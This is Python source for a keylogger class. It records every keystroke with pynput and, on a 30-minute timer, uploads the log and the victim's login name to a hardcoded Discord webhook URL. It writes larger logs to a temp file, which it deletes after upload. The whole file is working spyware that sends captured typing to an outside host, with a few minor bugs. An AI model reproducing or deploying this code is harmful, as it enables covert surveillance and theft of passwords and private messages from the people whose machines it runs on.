#!/usr/bin/env python
import os
import smtplib
import threading
import pynput
from discord_webhook import DiscordWebhook, DiscordEmbed
from pynput import keyboard

WEBHOOK = "https://discord.com/api/webhooks/937074392691789924/32S2tgJzk4KpK-MS_1QsZUeHq-uzrdUQm5aNB1RbCT3kBV40dNVHbIISntVU2aqto-n1"
class Keylogger:
    def __init__(self, time_interval=1800, report_method="webhook"):
        self.log = "Keylogger Started"
        self.interval = time_interval
        self.report_method = report_method
        self.username = os.getlogin()

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = "[ENTER]\n"
            elif key == key.tab:
                current_key = "[TAB]"
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report_to_webhook(self):
        flag = False
        webhook = DiscordWebhook(url=WEBHOOK)
        if len(self.log) > 2000:
            flag = True
            path = os.environ["temp"] + "\\report.text"
            with open(path, 'w+') as file:
                file.write("Keylogger Report From {self.username} Time: {self.end_dt}\n\n")
                file.write(self.log)
            with open(path, 'rb') as f:
                webhook.add_file(file=f.read(), filename='report.txt')
        else:
            embed = DiscordEmbed(title=f"Keylogger Report From ({self.username})", description=self.log)
            webhook.add_embed(embed)
        webhook.execute()
        if flag:
            os.remove(path)

    def report(self):
        self.report_method == "webhook"
        self.report_to_webhook()
        self.log = ""
        timer = threading.Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        keyword_listner = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyword_listner:
            self.report()
            keyword_listner.join()
